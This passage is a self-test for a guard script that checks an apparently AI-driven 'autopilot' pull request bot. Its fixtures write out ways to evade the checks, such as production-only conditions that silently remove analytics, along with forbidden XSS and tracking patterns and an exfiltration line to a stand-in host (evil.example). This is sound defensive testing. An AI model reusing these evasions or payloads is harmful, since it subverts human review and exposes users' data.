  if (result.skipped) return `autopilot-guard: ${result.branch ? `"${result.branch}" is` : 'this is'} not an autopilot branch; nothing to check`;
  const lines = [`autopilot-guard: ${result.branch}: ${result.files} changed files, ${result.changedLines} changed lines, ${Math.round(result.textBytes / 1024)} KB of added text, ${Math.round(result.binaryBytes / 1024)} KB of binary files (${result.base}...${result.head}, merge base ${String(result.mergeBase).slice(0, 7)})`];
  const list = (items) => items.map((v) => `  ${v.rule.padEnd(17)} ${v.file ? `${v.file}${v.line ? `:${v.line}` : ''}  ` : ''}${v.message}`);
  if (result.ok) lines.push('PASS: nothing an autopilot pull request may not change');
  else {
    lines.push(`FAIL: ${result.violations.length} violation${result.violations.length === 1 ? '' : 's'}`, ...list(result.violations));
    lines.push('Rules: autopilot/CONSTITUTION.md and docs/AUTOPILOT.md. A change that needs any of this goes to an autopilot:needs-owner issue.');
  }
  if (result.warnings.length) lines.push(`Warnings (not failures): ${result.warnings.length}`, ...list(result.warnings));
  return lines.join('\n');
}

// ---------- Self-test ----------

function selfTest() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'autopilot-guard-'));
  // Every commit is from the same day, which the ledger's dates are checked against.
  const COMMIT_DATE = '2026-10-15T12:00:00+00:00';
  const env = { ...process.env, GIT_AUTHOR_DATE: COMMIT_DATE, GIT_COMMITTER_DATE: COMMIT_DATE };
  const runAt = (date, ...args) => execFileSync('git', ['-c', 'user.name=Self Test', '-c', 'user.email=self-test@example.invalid', '-c', 'commit.gpgsign=false', ...args], { cwd: dir, env: { ...env, GIT_AUTHOR_DATE: date, GIT_COMMITTER_DATE: date }, stdio: ['ignore', 'pipe', 'pipe'], encoding: 'utf8' });
  const run = (...args) => runAt(COMMIT_DATE, ...args);
  const write = (file, content) => { fs.mkdirSync(path.dirname(path.join(dir, file)), { recursive: true }); fs.writeFileSync(path.join(dir, file), content); };
  const remove = (file) => fs.rmSync(path.join(dir, file), { force: true });
  // A valid change by default: a 28-day baseline that ends the day before the entry, and 14-day before/after windows
  // (which only a change has).
  const entry = (id, extra = {}) => {
    const value = { id, date: id.slice(0, 10), kind: 'change', title: 'A change', hypothesis: 'Clearer copy helps.', primary_metric: 'answered_visit_rate@v1', guardrails: ['one_page_no_action_rate@v1'], baseline: null, min_sample: 150, window_days: 14, decision_rule: 'Keep if the rate rises.', evaluate_after: '2026-10-28', status: 'proposed', pr: null, verdict: null, result: null, ...extra };
    const day = validDate(value.date) ? value.date : '2026-10-14';
    if (!('baseline' in extra)) value.baseline = { window: `${addDays(day, -28)}..${addDays(day, -1)}`, rate: 0.4, n: 120 };
    if (value.kind !== 'change' && !('window_days' in extra)) delete value.window_days;
    return JSON.stringify(value);
  };
  const CHANGE_ID = '2026-10-14-test';
  const proposal = (extra = {}) => entry(CHANGE_ID, extra);
  const FIRST = { status: 'shipped', pr: 60 };
  const BASE_LEDGER = `${entry('2026-10-01-first', FIRST)}\n`;
  const STORE = "export function read() {\n  try { return window.localStorage.getItem('units'); } catch { return null; }\n}\nexport function other() {\n  return 1;\n}\n";
  const TICKER = '/**\n * Advances the clock once a frame.\n */\nexport function tick() {\n  return 1;\n}\n';
  // The §1 table defines three names; the others in the file are only mentioned.
  const METRICS_TEXT = [
    '# Metrics', '', 'An earlier draft used `engaged_visit_rate@v1`.', '',
    '## 1. Definitions', '', '| Metric | Definition | Direction |', '|---|---|---|',
    '| `answered_visit_rate@v1` (**north star**) | Share of visits with an answer signal. | Higher is better. |',
    '| `one_page_no_action_rate@v1` (guardrail) | One page view and no answer signal. | Lower is better. |',
    '| `error_visit_rate@v1` (guardrail) | Share of visits with a `site_error`. | At most 1%. |', '',
    'An answer signal is a `tool_used@v1` event, among others.', '',
    '## 2. Queries', '', '| `bounce_rate@v1` | not a definition |', '',
  ].join('\n');
  const LAYOUT = "import SiteAnalytics from '@/components/SiteAnalytics';\nexport default function RootLayout({ children }) {\n  return <html><body>{children}<SiteAnalytics /></body></html>;\n}\n";
  const failures = [];
  let cases = 0;
  try {
    run('init', '-q', '-b', 'main');
    write('app/layout.tsx', LAYOUT);
    write('app/page.tsx', 'export default function Home() { return <h1>Pace Notes</h1>; }\n');
    write('app/tools/page.tsx', 'export default function Tools() { return <h1>Tools</h1>; }\n');
    write('app/robots.ts', 'export default function robots() { return { rules: [] }; }\n');
    write('app/not-found.tsx', 'export default function NotFound() { return <h1>Not found</h1>; }\n');
    write('components/Card.tsx', 'export function Card() {\n  return <div>Card</div>;\n}\n');
    write('components/Store.tsx', STORE);
    write('components/Ticker.tsx', TICKER);
    write('lib/analytics.ts', 'export const on = true;\n');
    write(EXPERIMENT_REGISTRY, 'export const EXPERIMENTS = [];\n');
    write('docs/NOTES.md', '# Notes\n');
    write('docs/snippet.md', STORE);
    write('README.md', '# Pace Notes\n');
    write('public/og/card.png', Buffer.concat([Buffer.from('\x89PNG\r\n\x1a\n', 'binary'), Buffer.alloc(64)]));
    write(LEDGER, BASE_LEDGER);
    write(METRICS, METRICS_TEXT);
    run('add', '-A'); run('commit', '-q', '-m', 'base');

    // The clock reads the same day as the commits unless a case says otherwise (`now`), and a case may date its own
    // commit (`commitDate`), as anyone can.
    const expect = (label, { branch = 'autopilot/2026-10-14-test', base = 'main', ledger = true, pr = null, commitDate = COMMIT_DATE, now = COMMIT_DATE, setup, dirty, rules = [], messages = [], absent = [], warned = [] }) => {
      cases += 1;
      run('checkout', '-q', '-f', base);
      run('clean', '-q', '-fdx');
      run('checkout', '-q', '-B', `case-${cases}`);
      if (ledger) fs.appendFileSync(path.join(dir, LEDGER), `${proposal()}\n`);
      setup();
      run('add', '-A');
      runAt(commitDate, 'commit', '-q', '--allow-empty', '-m', label);
      if (dirty) dirty();
      let result;
      try { result = check({ cwd: dir, base, head: 'HEAD', branch, pr, now: new Date(now) }); } catch (error) { failures.push(`${label}: threw ${error.message}`); return; }
      const got = [...new Set(result.violations.map((v) => v.rule))].sort();
      const want = [...new Set(rules)].sort();
      if (JSON.stringify(got) !== JSON.stringify(want)) failures.push(`${label}: expected [${want.join(', ') || 'pass'}], got [${got.join(', ') || 'pass'}]${result.violations.length ? `: ${result.violations.map((v) => `${v.rule} ${v.file || ''}:${v.line || ''} ${v.message}`).join(' | ')}` : ''}`);
      for (const text of messages) if (!result.violations.some((v) => `${v.file}:${v.line} ${v.message}`.includes(text))) failures.push(`${label}: no violation mentions "${text}"`);
      for (const text of absent) if (result.violations.some((v) => `${v.file}:${v.line} ${v.message}`.includes(text))) failures.push(`${label}: a violation mentions "${text}"`);
      for (const text of warned) if (!result.warnings.some((v) => `${v.file}:${v.line} ${v.message}`.includes(text))) failures.push(`${label}: no warning mentions "${text}"`);
      return result;
    };
    const component = (code) => `export function Card() {\n  ${code}\n  return <div>Card</div>;\n}\n`;

    // Branches
    const skipped = expect('non-autopilot branch passes without checks', { branch: 'feature/anything', ledger: false, setup: () => write('lib/analytics.ts', 'export const on = false;\n') });
    if (skipped && !skipped.skipped) failures.push('non-autopilot branch: not reported as skipped');
    expect('a well-formed change passes', { setup: () => write('components/Card.tsx', 'export function Card() {\n  return <div>Better card</div>;\n}\n') });
    expect('branch without a date', { branch: 'autopilot/home-hero', setup: () => {}, rules: ['branch-name'] });
    expect('branch with an impossible date', { branch: 'autopilot/2026-13-14-home', setup: () => {}, rules: ['branch-name'] });
    expect('branch with capitals', { branch: 'autopilot/2026-10-14-Home', setup: () => {}, rules: ['branch-name'] });
    expect('branch with a double hyphen', { branch: 'autopilot/2026-10-14-home--hero', setup: () => {}, rules: ['branch-name'] });
    expect('branch over 80 characters', { branch: `autopilot/2026-10-14-${'a'.repeat(60)}`, setup: () => {}, rules: ['branch-name'] });

    // Protected paths: change, add, delete, rename out of and into
    expect('protected file changed', { setup: () => write('lib/analytics.ts', 'export const on = false;\n'), rules: ['protected-path'], messages: ['lib/analytics.ts'] });
    expect('protected folder file added', { setup: () => write('scripts/new.cjs', 'console.log(1);\n'), rules: ['protected-path'] });
    expect('workflow added', { setup: () => write('.github/workflows/x.yml', 'on: push\n'), rules: ['protected-path'] });
    expect('protected file deleted', { setup: () => remove('lib/analytics.ts'), rules: ['protected-path'] });
    expect('protected file renamed out', { setup: () => { remove('lib/analytics.ts'); write('lib/stats.ts', 'export const on = true;\n'); }, rules: ['protected-path'], messages: ['lib/analytics.ts'] });
    expect('file renamed into a protected folder', { setup: () => { remove('components/Card.tsx'); write('scripts/Card.tsx', 'export function Card() {\n  return <div>Card</div>;\n}\n'); }, rules: ['protected-path'], messages: ['scripts/Card.tsx'] });
    for (const file of ['public/data/x.json', 'analysis/release.json', 'components/UnitsProvider.tsx', 'app/privacy/page.tsx', 'app/error.tsx', 'app/global-error.tsx', 'app/tools/error.tsx', 'app/tools/not-found.tsx', 'components/ExperimentVariant.tsx', 'next.config.mjs', 'LICENSE', 'package.json', 'lib/package.json', 'autopilot/CONSTITUTION.md', '.claude/skills/x/SKILL.md', 'CLAUDE.md', 'docs/ANALYTICS.md', 'docs/AUTOPILOT.md', 'docs/PROJECT_HANDOFF.md', 'docs/evidence/x/audit.md']) {
      expect(`protected ${file}`, { setup: () => write(file, '{}\n'), rules: ['protected-path'] });
    }
    expect('protected app/not-found.tsx changed', { setup: () => write('app/not-found.tsx', 'export default function NotFound() { return <h1>Lost?</h1>; }\n'), rules: ['protected-path'] });
    // Outside the allowed folders: root files, dotfiles anywhere, new top-level folders, non-Markdown docs, other autopilot files.
    for (const file of ['.env.production', 'postcss.config.js', '.postcssrc.json', '.babelrc', 'babel.config.json', '.vercelignore', 'middleware.ts', 'README.md', 'src/app/page.tsx', 'utils/x.ts', 'public/.well-known/x.txt', 'components/.eslintrc.json', 'docs/x.json', 'docs/widget.tsx', 'autopilot/visit.ts', 'autopilot/notes.md']) {
      expect(`off limits ${file}`, { setup: () => write(file, 'export const x = 1;\n'), rules: ['protected-path'] });
    }
    // Shadowing: webpack resolves .js and .mjs before .ts, so a sibling would replace a protected module.
    expect('JavaScript sibling of a protected module', { setup: () => write('lib/analytics-policy.js', "export * from './analytics-policy.ts';\nexport function sanitizeAnalyticsEvent(event) { return event; }\n"), rules: ['file-type', 'protected-path'], messages: ['lib/analytics-policy.js'] });
    expect('.mjs sibling of a protected component', { setup: () => write('components/SiteAnalytics.mjs', 'export default function SiteAnalytics() { return null; }\n'), rules: ['file-type', 'protected-path'] });
    expect('a new JavaScript file in site code', { setup: () => write('lib/helper.jsx', 'export const x = 1;\n'), rules: ['file-type'] });
    expect('a TypeScript helper next to a protected module is fine', { setup: () => write('lib/analytics-labels.ts', "export const LABEL = 'Visits';\n") });
    expect('the experiment registry may change', { setup: () => write('lib/experiments.ts', "export const EXPERIMENTS = [];\n") });

    // Routes
    expect('page deleted', { setup: () => remove('app/tools/page.tsx'), rules: ['route-deletion'] });
    expect('page renamed', { setup: () => { remove('app/tools/page.tsx'); write('app/kit/page.tsx', 'export default function Tools() { return <h1>Tools</h1>; }\n'); }, rules: ['route-deletion'] });
    expect('robots route deleted', { setup: () => remove('app/robots.ts'), rules: ['route-deletion'] });
    expect('page added', { setup: () => write('app/guide/page.tsx', 'export default function Guide() { return <h1>Guide</h1>; }\n') });

    // Required content
    expect('SiteAnalytics removed', { setup: () => write('app/layout.tsx', LAYOUT.replace('<SiteAnalytics />', '')), rules: ['protected-path', 'required-content'] });
    expect('SiteAnalytics commented out', { setup: () => write('app/layout.tsx', LAYOUT.replace('<SiteAnalytics />', '{/* <SiteAnalytics /> */}')), rules: ['protected-path', 'required-content'] });
    expect('SiteAnalytics only in a trailing comment', { setup: () => write('app/layout.tsx', LAYOUT.replace('{children}<SiteAnalytics /></body></html>;', '{children}</body></html>; // <SiteAnalytics /> moved later')), rules: ['protected-path', 'required-content'] });
    expect('SiteAnalytics behind false &&', { setup: () => write('app/layout.tsx', LAYOUT.replace('<SiteAnalytics />', '{false && <SiteAnalytics />}')), rules: ['protected-path', 'required-content'] });
    expect('ExperimentHead absent on base and head is refused only as a protected path', { setup: () => write('app/layout.tsx', LAYOUT.replace('<html>', '<html lang="en">')), rules: ['protected-path'] });
    run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', 'main-exp');
    write('app/layout.tsx', LAYOUT.replace('<html>', '<html><head><ExperimentHead /></head>'));
    run('add', '-A'); run('commit', '-q', '-m', 'experiments');
    expect('ExperimentHead kept', { base: 'main-exp', setup: () => write('components/Card.tsx', 'export const x = 1;\n') });
    expect('ExperimentHead removed', { base: 'main-exp', setup: () => write('app/layout.tsx', LAYOUT), rules: ['protected-path', 'required-content'], messages: ['ExperimentHead'] });
    // A condition of any kind around a required tag, a wrapper, or an early return: Vercel sets VERCEL_ENV per
    // deployment, so a production-only condition passes every check before the merge and removes analytics after it.
    const wrapped = (replacement, extra = '') => LAYOUT.replace('<SiteAnalytics />', replacement).replace('export default', `${extra}export default`);
    for (const [label, replacement, extra] of [
      ['SiteAnalytics behind a production-only condition', "{process.env.VERCEL_ENV !== 'production' && <SiteAnalytics />}"],
      ['SiteAnalytics in a ternary', "{process.env.VERCEL_ENV === 'production' ? null : <SiteAnalytics />}"],
      ['SiteAnalytics after ||', "{process.env.VERCEL_ENV === 'production' || <SiteAnalytics />}"],
      ['SiteAnalytics after ??', '{process.env.NEXT_PUBLIC_NO_ANALYTICS ?? <SiteAnalytics />}'],
      ['SiteAnalytics in a fragment behind a condition', "{process.env.VERCEL_ENV !== 'production' && <><SiteAnalytics /></>}"],
      ['SiteAnalytics in a wrapper the layout defines', '<DevOnly><SiteAnalytics /></DevOnly>', "function DevOnly({ children }) {\n  return process.env.VERCEL_ENV === 'production' ? null : children;\n}\n"],
      ['SiteAnalytics replaced by a component the layout defines', '<SiteAnalytics />', 'function SiteAnalytics() {\n  return null;\n}\n'],
    ]) {
      expect(label, { setup: () => write('app/layout.tsx', label.includes('replaced') ? wrapped(replacement, extra).replace("import SiteAnalytics from '@/components/SiteAnalytics';\n", '') : wrapped(replacement, extra)), rules: ['protected-path', 'required-content'], messages: ['SiteAnalytics'] });
    }
    expect('SiteAnalytics in a wrapper from another file', { setup: () => { write('components/DevOnly.tsx', "export default function DevOnly({ children }) {\n  return process.env.VERCEL_ENV === 'production' ? null : children;\n}\n"); write('app/layout.tsx', wrapped('<DevOnly><SiteAnalytics /></DevOnly>', "import DevOnly from '@/components/DevOnly';\n")); }, rules: ['protected-path', 'required-content'], messages: ['SiteAnalytics'] });
    expect('SiteAnalytics after an early production-only return', { setup: () => write('app/layout.tsx', LAYOUT.replace('  return <html>', "  if (process.env.VERCEL_ENV === 'production') return <html><body>{children}</body></html>;\n  return <html>")), rules: ['protected-path', 'required-content'] });
    expect('a production-only root element', { setup: () => write('app/layout.tsx', LAYOUT.replace('return <html><body>{children}<SiteAnalytics /></body></html>;', "return process.env.VERCEL_ENV === 'production' ? <html><body>{children}</body></html> : <html><body>{children}<SiteAnalytics /></body></html>;")), rules: ['protected-path', 'required-content'] });
    expect('ExperimentHead behind a production-only condition', { base: 'main-exp', setup: () => write('app/layout.tsx', LAYOUT.replace('<html>', "<html><head>{process.env.VERCEL_ENV !== 'production' && <ExperimentHead />}</head>")), rules: ['protected-path', 'required-content'], messages: ['ExperimentHead'] });
    expect('a new meta tag beside ExperimentHead is refused only as a protected path', { base: 'main-exp', setup: () => write('app/layout.tsx', LAYOUT.replace('<html>', '<html><head><meta name="format-detection" content="telephone=no" /><ExperimentHead /></head>')), rules: ['protected-path'] });
    expect('a className on body is refused only as a protected path', { setup: () => write('app/layout.tsx', LAYOUT.replace('<body>', '<body className="site">')), rules: ['protected-path'] });
    // The real root layout (main's, on an up-to-date branch): unchanged, and with the edits above.
    const realLayout = (() => { try { return fs.readFileSync(path.join(__dirname, '..', 'app', 'layout.tsx'), 'utf8'); } catch { return null; } })();
    if (realLayout === null || !realLayout.includes('<SiteAnalytics />') || !realLayout.includes('<body>')) failures.push('the real app/layout.tsx could not be read, or no longer has <SiteAnalytics /> and <body>: run the self-test in a full checkout, and update these cases with the layout');
    else {
      run('checkout', '-q', '-f', 'main'); run('checkout', '-q', '-B', 'main-real');
      write('app/layout.tsx', realLayout);
      run('add', '-A'); run('commit', '-q', '-m', 'the real layout');
      expect("main's layout unchanged passes", { base: 'main-real', setup: () => write('components/Card.tsx', 'export const x = 1;\n') });
      expect("a className on main's body is refused only as a protected path", { base: 'main-real', setup: () => write('app/layout.tsx', realLayout.replace('<body>', '<body className="site">')), rules: ['protected-path'] });
      expect("main's layout with a production-only SiteAnalytics", { base: 'main-real', setup: () => write('app/layout.tsx', realLayout.replace('<SiteAnalytics />', "{process.env.VERCEL_ENV !== 'production' && <SiteAnalytics />}")), rules: ['protected-path', 'required-content'], messages: ['SiteAnalytics'] });
      expect("main's layout with SiteAnalytics moved out of UnitsProvider", { base: 'main-real', setup: () => write('app/layout.tsx', realLayout.replace('        <SiteAnalytics />\n', '').replace('</UnitsProvider></body>', '</UnitsProvider><SiteAnalytics /></body>')), rules: ['protected-path', 'required-content'], messages: ['SiteAnalytics'] });
    }

    // Forbidden patterns: each on its own, in a component
    const FORBIDDEN_CASES = [
      ['<script', '<script>alert(1)</script>'], ['next/script', "import Script from 'next/script';"], ['dangerouslySetInnerHTML', '<div dangerouslySetInnerHTML={{ __html: x }} />'],
      ['HTML injection', 'el.innerHTML = text;'], ['eval(', 'eval(code);'], ['new Function(', 'const f = new Function("return 1");'],
      ['document.cookie', 'document.cookie = "a=1";'], ['browser storage', 'window.localStorage.setItem("k", v);'], ['browser storage', 'sessionStorage.getItem("k");'],
      ['browser storage', 'indexedDB.open("db");'], ['navigator.sendBeacon', 'navigator.sendBeacon("/x", body);'], ['XMLHttpRequest', 'new XMLHttpRequest();'],
      ['new WebSocket', 'new WebSocket("wss://x");'], ['EventSource(', 'new EventSource("/x");'], ['PostHog', "import posthog from 'posthog-js';"], ['PostHog', '// PostHog sees this'],
      ['<iframe', '<iframe title="x" />'], ['<iframe', '<object data="/x.pdf" />'], ['<base', '<base href="/" />'], ['javascript: URL', '<a href="javascript:void(0)">x</a>'],
      ['fetch( of an absolute URL', "fetch('https://api.example.com/x');"], ['fetch( of an absolute URL', 'fetch(`//cdn.example.com/x`)'], ['fetch( of an absolute URL', "fetch(new Request('https://api.example.com/x'));"],
      ['import( of an http(s) URL', "import('https://cdn.example.com/x.js');"], ['src=/srcSet= of an absolute URL', '<img src="https://images.example.com/a.png" alt="" />'],
      ['src=/srcSet= of an absolute URL', '<img srcSet={"https://images.example.com/a.png 2x"} alt="" />'], ['src=/srcSet= of an absolute URL', '<img srcSet="/a.png 1x, https://cdn.example.com/a@2x.png 2x" alt="" />'],
      ['url( of an absolute URL', "const bg = { backgroundImage: 'url(https://images.example.com/a.png)' };"],
      ['@import of an http(s) URL', "@import 'https://fonts.example.com/a.css';"], ['<link>/<image>/<use> of an absolute URL', '<link rel="preconnect" href="https://fonts.example.com" />'],
      ['RTCPeerConnection', 'new RTCPeerConnection();'], ['service worker', "navigator.serviceWorker.register('/sw.js');"],
      ['a custom error boundary', 'static getDerivedStateFromError() { return { failed: true }; }'], ['a custom error boundary', 'componentDidCatch(error) { this.setState({ error }); }'],
    ];
    for (const [name, code] of FORBIDDEN_CASES) {
      expect(`forbidden ${name}: ${code}`, { setup: () => write('components/Card.tsx', component(code)), rules: ['forbidden-pattern'], messages: [`components/Card.tsx:2 ${name}`] });
    }
    // Addresses on other hosts in constants, data and templates, which a later line loads.
    const ANOTHER_HOST = [
      "const HERO = 'https://images.example.com/hero.jpg';",
      "const LOGOS = [{ logo: 'https://upload.wikimedia.org/a.svg' }];",
      "const CDN = 'https://cdn.example.com';",
      "const FONT = '//fonts.example.com/a.css';",
      "export const metadata = { icons: { icon: 'https://cdn.example.com/icon.png' } };",
      "const API = `https://api.example.com/v1`;",
      '<Image loader={() => `https://cdn.example.com/x.png`} src="/x.png" alt="" />',
      "img.setAttribute('src', 'https://pixel.example.com/p.gif');",
      "const set = 'image-set(\"https://cdn.example.com/a.png\" 1x)';",
      "const repo = 'https://github.com/someone-else/x/raw/main/a.png';",
    ];
    for (const code of ANOTHER_HOST) expect(`another host: ${code}`, { setup: () => write('components/Card.tsx', component(code)), rules: ['forbidden-pattern'], messages: ['components/Card.tsx:2 an address on another host'] });
    // Comment markers inside strings do not hide the code after them.
    for (const code of ["const OPEN = '/*', PIXEL = 'https://pixel.example.net/p.gif', CLOSE = '*/';", "const PIXEL = [' //', 'https://pixel.example.net/p.gif'][1];"]) {
      expect(`a comment marker in a string: ${code}`, { setup: () => write('components/Card.tsx', component(code)), rules: ['forbidden-pattern'], messages: ['components/Card.tsx:2 an address on another host (pixel.example.net)'] });
    }
    for (const code of ['const PIXEL = `https://${HOST}/p.gif`;', "const PIXEL = 'https://' + HOST + '/p.gif';"]) {
      expect(`a computed host: ${code}`, { setup: () => write('components/Card.tsx', component(code)), rules: ['forbidden-pattern'], messages: ['components/Card.tsx:2 an address whose host is computed'] });
    }
    expect('forbidden pattern split over lines', { setup: () => write('components/Card.tsx', 'export function Card() {\n  return <link\n    rel="stylesheet"\n    href="https://fonts.example.com/a.css" />;\n}\n'), rules: ['forbidden-pattern'], messages: ['components/Card.tsx:2'] });
    expect('forbidden pattern in a CSS file', { setup: () => write('app/x.css', '.a { background: url("//images.example.com/a.png"); }\n'), rules: ['forbidden-pattern'] });
    expect('forbidden pattern in an SVG under public', { setup: () => write('public/x.svg', '<svg><script>alert(1)</script></svg>\n'), rules: ['forbidden-pattern'] });
    expect('inline event handler in public HTML', { setup: () => write('public/landing.html', '<img src="/a.png" onerror="go()">\n'), rules: ['forbidden-pattern'], messages: ['inline event handler'] });
    expect('a public worker that sends data elsewhere', { setup: () => write('public/w.js', "fetch('https://evil.example/?' + self.name);\n"), rules: ['forbidden-pattern'] });
    expect('Markdown under public is scanned', { setup: () => write('public/notes.md', 'Runners hit the wall. Your chance of finishing.\n'), rules: ['banned-copy'] });
    expect('a file moved from docs into a component is read in full', { setup: () => { remove('docs/snippet.md'); write('components/Snippet.tsx', STORE); }, rules: ['forbidden-pattern'], messages: ['components/Snippet.tsx:2 browser storage'] });
    expect('allowed: links, local fetch, local images', { setup: () => write('components/Card.tsx', 'export function Card() {\n  fetch(\'/data/x.json\');\n  return <a href="https://doi.org/10.1371/journal.pone.0251513"><img src="/og/card.png" alt="" /></a>;\n}\n') });
    expect('allowed: links in data, next/link, identifiers and notes', {
      setup: () => write('components/Card.tsx', [
        "import Link from 'next/link';",
        "const SOURCES = [{ label: 'Ely (2007)', url: 'https://experts.umn.edu/en/publications/x' }, { name: 'Weather', href: 'https://open-meteo.com/en/docs' }];",
        "const LD = { '@context': 'https://schema.org', url: `https://splithappens.run/` };",
        "const RELEASES = 'https://github.com/koolkam00/htw-live-study/releases';",
        '// Layout shift as defined at https://web.dev/articles/cls',
        'export function Card() {',
        '  const url = new URL(path, \'https://splithappens.run\');',
        '  return <svg xmlns="http://www.w3.org/2000/svg"><Link href="https://doi.org/10.1371/journal.pone.0251513">Published method</Link><Frame title="Pace" /><Embed /></svg>;',
        '}',
        '',
      ].join('\n')),
    });
    // Ordinary code and copy that only looks like a rule.
    expect('allowed: type arguments named object', { setup: () => write('lib/chart-types.ts', "const rows: Array<object> = [];\nconst cache = new WeakMap<object, string>();\nexport function useRow(useState: <T>(v: T) => [T, (v: T) => void]) { return useState<object | null>(null); }\nexport { rows, cache };\n") });
    expect('<object split over lines is still a tag', { setup: () => write('components/Card.tsx', 'export function Card() {\n  return <object\n    data="/x.pdf" />;\n}\n'), rules: ['forbidden-pattern'], messages: ['<object'] });
    expect('allowed: "JavaScript:" in copy', { setup: () => write('components/Card.tsx', component('const note = <noscript>This chart needs JavaScript: turn it on to see it.</noscript>;')) });
    expect("allowed: the URL constructor with the site's own address", { setup: () => write('components/Card.tsx', component("const url = new URL('https://splithappens.run' + path);")) });
    expect('allowed: "the wall clock"', { setup: () => write('components/Card.tsx', component('const gun = <p>Gun time is what the wall clock over the finish showed.</p>;')) });
    expect('allowed: the release-tag prefix in a data loader', { setup: () => write('lib/pack-data.ts', "export const inputId = (tag: string) => tag.replace('private-export-', 'private-');\n") });
    expect('allowed: namespaces in an exported SVG', { setup: () => write('public/art/badge.svg', '<svg xmlns="http://www.w3.org/2000/svg" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"><path d="M0 0h1"/></svg>\n') });
    expect('allowed: JSON-LD identifiers', { setup: () => write('components/Card.tsx', component("const LD = { '@type': 'Dataset', license: 'https://creativecommons.org/licenses/by/4.0/', '@id': 'https://splithappens.run/#dataset', sameAs: 'https://www.wikidata.org/wiki/Q1' };")) });
    expect("allowed: the owner's GitHub profile", { setup: () => write('components/Card.tsx', component("const PROFILE = 'https://github.com/koolkam00';")) });
    expect('allowed: a computed address in a link', { setup: () => write('components/Card.tsx', component('const go = <a href={`https://${host}/x`}>x</a>;')) });
    expect('allowed: a line added inside an existing JSDoc comment', { setup: () => write('components/Ticker.tsx', TICKER.replace(' * Advances the clock once a frame.\n', ' * Advances the clock once a frame.\n * Frame budget: https://web.dev/articles/rendering-performance\n')) });
    expect('allowed: words in docs and the backlog', { setup: () => { write('docs/NOTES.md', 'PostHog, localStorage and the wall, written in docs.\n'); write('autopilot/backlog.md', 'Check posthog funnels; avoid "arithmetic".\n'); } });
    expect('only added lines are scanned', { setup: () => write('components/Store.tsx', STORE.replace('return 1;', 'return 2;')) });
    expect('a scanned file renamed within site code keeps its old lines unscanned', { setup: () => { remove('components/Store.tsx'); write('components/Saved.tsx', STORE); } });
    const [READ, OTHER] = [STORE.slice(0, STORE.indexOf('export function other')), STORE.slice(STORE.indexOf('export function other'))];
    expect('existing code moved to a new file is not reported again', { setup: () => { write('components/Store.tsx', OTHER); write('components/store-read.ts', READ); } });
    expect('a moved line that is edited is reported', { setup: () => { write('components/Store.tsx', OTHER); write('components/store-read.ts', READ.replace("'units'", "'unit-pref'")); }, rules: ['forbidden-pattern'], messages: ['components/store-read.ts:2 browser storage'] });
    expect('a line copied, not moved, is reported', { setup: () => write('components/store-read.ts', READ), rules: ['forbidden-pattern'], messages: ['components/store-read.ts:2 browser storage'] });

    // Banned copy
    for (const [label, text] of [['arithmetic', 'Simple arithmetic.'], ['the wall', 'Runners hit the wall.'], ['the wall', 'Before the  wall'], ['your chance', 'Your chance of finishing'], ['private-export', 'From private-export-20260912-0934'], ['20260912', 'Built 20260912'], ['htw-db', 'From htw-db-2026-10-16-1652'], ['20261016', 'Built 20261016'], ['20261021', 'Built 20261021']]) {
      expect(`banned ${label}`, { setup: () => write('components/Card.tsx', `export function Card() {\n  return <p>${text}</p>;\n}\n`), rules: ['banned-copy'] });
    }

    // Size, binaries and text
    expect('61 changed files', { setup: () => { for (let i = 0; i < 60; i += 1) write(`components/gen/F${i}.tsx`, `export const f${i} = ${i};\n`); }, rules: ['size'], messages: ['61 changed files'] });
    expect('60 changed files', { setup: () => { for (let i = 0; i < 59; i += 1) write(`components/gen/F${i}.tsx`, `export const f${i} = ${i};\n`); } });
    expect('1,501 changed lines', { setup: () => write('components/Long.tsx', Array.from({ length: 1501 }, (_, i) => `export const v${i} = ${i};`).join('\n') + '\n'), rules: ['size'], messages: ['1501 changed lines'] });
    expect('1,500 changed lines', { setup: () => write('components/Long.tsx', Array.from({ length: 1500 }, (_, i) => `export const v${i} = ${i};`).join('\n') + '\n') });
    expect('a multi-megabyte line of text', { setup: () => write('components/Hero.tsx', `export const HERO = "data:image/png;base64,${'A'.repeat(5 * 1024 * 1024)}";\n`), rules: ['size'], messages: ['KB of text', 'characters'] });
    expect('an SVG with a 5 MB inlined image', { setup: () => write('public/hero.svg', `<svg><image href="data:image/png;base64,${'A'.repeat(5 * 1024 * 1024)}"/></svg>\n`), rules: ['size'], messages: ['KB of text'] });
    expect('a line over 3,000 characters', { setup: () => write('components/Card.tsx', component(`const s = '${'x'.repeat(3001)}';`)), rules: ['size'], messages: ['characters'] });
    expect('more than 1 MB of text in total', { setup: () => { for (let i = 0; i < 6; i += 1) write(`public/t${i}.txt`, `${'word '.repeat(39000)}\n`); }, rules: ['size'], messages: ['MB of text'] });
    const png = (kb) => Buffer.concat([Buffer.from('\x89PNG\r\n\x1a\n', 'binary'), Buffer.alloc(8), Buffer.alloc(kb * 1024 - 16, 1)]);
    const gif = (kb) => Buffer.concat([Buffer.from('GIF89a', 'binary'), Buffer.alloc(kb * 1024 - 6, 0x21)]);
    expect('binary under public', { setup: () => write('public/og/new.png', png(100)) });
    expect('binary outside public', { setup: () => write('components/x.png', png(1)), rules: ['binary'] });
    expect('a TrueType font under public', { setup: () => write('public/fonts/Display.ttf', Buffer.concat([Buffer.from([0, 1, 0, 0]), Buffer.alloc(2048, 7)])) });
    expect('a font outside public', { setup: () => write('components/Display.otf', Buffer.concat([Buffer.from('OTTO', 'binary'), Buffer.alloc(2048, 0)])), rules: ['binary'] });
    expect('Next.js icons and share images under app', { setup: () => { write('app/apple-icon.png', png(20)); write('app/icon1.png', png(5)); write('app/finish-times/opengraph-image.png', png(80)); write('app/favicon.ico', png(4)); } });
    expect('another image under app', { setup: () => write('app/hero.png', png(20)), rules: ['binary'], messages: ['app/hero.png'] });
    expect('a GIF with no NUL byte outside public', { setup: () => write('components/blob.gif', gif(10)), rules: ['binary'], messages: ['components/blob.gif'] });
    expect('binary deleted under public', { setup: () => remove('public/og/card.png') });
    expect('binary over 600 KB', { setup: () => write('public/og/big.png', png(601)), rules: ['binary'], messages: ['601 KB'] });
    expect('a GIF over 600 KB with no NUL byte', { setup: () => write('public/og/big.gif', gif(700)), rules: ['binary'], messages: ['700 KB'] });
